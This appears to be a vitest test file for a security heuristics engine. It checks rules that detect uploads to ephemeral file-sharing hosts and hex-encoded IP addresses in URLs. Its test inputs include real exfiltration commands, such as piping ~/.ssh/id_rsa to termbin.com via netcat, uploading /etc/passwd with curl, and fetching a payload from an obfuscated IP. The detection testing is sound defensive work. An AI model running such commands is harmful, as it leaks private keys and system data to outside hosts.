import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");
const matchUrl = createMatcher("url");

describe("URL threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- CLT-URL-006: Ephemeral file-upload hosts (data exfiltration) ---

	describe("CLT-URL-006: ephemeral file-upload hosts", () => {
		// Branch 1: full URL form (url artifact + command-embedded URL)

		it("detects transfer.sh upload as a url artifact", () => {
			expect(matchUrl(engine, "https://transfer.sh/abc/secret.txt")).toContain("CLT-URL-006");
		});

		it("detects file.io as a url artifact", () => {
			expect(matchUrl(engine, "https://file.io/xYz123")).toContain("CLT-URL-006");
		});

		it("detects 0x0.st as a url artifact", () => {
			expect(matchUrl(engine, "https://0x0.st/abcd.txt")).toContain("CLT-URL-006");
		});

		it("detects curl --upload-file to transfer.sh in a command", () => {
			expect(
				matchCommand(engine, "curl --upload-file ./secret.txt https://transfer.sh/"),
			).toContain("CLT-URL-006");
		});

		it("detects temp.sh upload over http in a command", () => {
			expect(matchCommand(engine, "curl -T data.zip http://temp.sh/data.zip")).toContain(
				"CLT-URL-006",
			);
		});

		// Branch 2: bare domain in a network-tool context (no scheme)

		it("detects termbin.com exfiltration via netcat (no URL scheme)", () => {
			expect(matchCommand(engine, "cat ~/.ssh/id_rsa | nc termbin.com 9999")).toContain(
				"CLT-URL-006",
			);
		});

		it("detects bare-domain bashupload.com upload via curl", () => {
			expect(matchCommand(engine, "curl bashupload.com -T /etc/passwd")).toContain("CLT-URL-006");
		});

		it("detects bare-domain 0x0.st upload via curl -F", () => {
			expect(matchCommand(engine, "curl -F 'file=@dump.sql' 0x0.st")).toContain("CLT-URL-006");
		});

		// Negative: local scripts sharing a host name must NOT match

		it("does not flag a local transfer.sh script", () => {
			expect(matchCommand(engine, "./transfer.sh --verbose")).not.toContain("CLT-URL-006");
		});

		it("does not flag running a local temp.sh via bash", () => {
			expect(matchCommand(engine, "bash temp.sh")).not.toContain("CLT-URL-006");
		});

		it("does not flag sourcing a local transfer.sh", () => {
			expect(matchCommand(engine, "source /usr/local/bin/transfer.sh")).not.toContain(
				"CLT-URL-006",
			);
		});

		// Negative: unrelated upload to a normal host

		it("does not flag a normal upload to an unrelated host", () => {
			expect(
				matchCommand(engine, "curl --upload-file ./report.pdf https://example.com/"),
			).not.toContain("CLT-URL-006");
		});
	});

	// --- CLT-URL-007: Hex-encoded IP address in URL ---

	describe("CLT-URL-007: hex-encoded IP in URL", () => {
		// Positive: hex octet forms (url artifact + command-embedded).
		// Test addresses use RFC 5737 documentation ranges (203.0.113.0/24,
		// 198.51.100.0/24) — public hosts standing in for a C2 / staging
		// server, matching the personal-device threat model.

		it("detects a fully hex-encoded public IP as a url artifact (203.0.113.5)", () => {
			expect(matchUrl(engine, "http://0xcb.0x0.0x71.0x5/")).toContain("CLT-URL-007");
		});

		it("detects another fully hex-encoded public IP (198.51.100.23)", () => {
			expect(matchUrl(engine, "http://0xc6.0x33.0x64.0x17/payload")).toContain("CLT-URL-007");
		});

		it("detects a mixed hex/decimal IP with a hex first octet (203.0.113.5)", () => {
			expect(matchUrl(engine, "http://0xcb.0.113.5/")).toContain("CLT-URL-007");
		});

		it("detects a mixed IP with a hex octet in the middle (198.51.100.23)", () => {
			expect(matchUrl(engine, "http://198.0x33.100.23/")).toContain("CLT-URL-007");
		});

		it("detects a hex IP fetched via curl in a command", () => {
			expect(matchCommand(engine, "curl http://0xcb.0x0.0x71.0x5/payload")).toContain(
				"CLT-URL-007",
			);
		});

		// Negative: a domain that merely starts with 0x must NOT be a hex IP

		it("does not misclassify the 0x0.st exfil domain as a hex IP", () => {
			expect(matchUrl(engine, "https://0x0.st/abcd.txt")).not.toContain("CLT-URL-007");
		});

		it("does not flag a hex token in the URL path", () => {
			expect(matchUrl(engine, "https://example.com/commit/0xab.0xcd")).not.toContain("CLT-URL-007");
		});

		it("does not flag a normal dotted-decimal IP (that is CLT-URL-004's job)", () => {
			expect(matchUrl(engine, "http://203.0.113.5/")).not.toContain("CLT-URL-007");
		});
	});
});
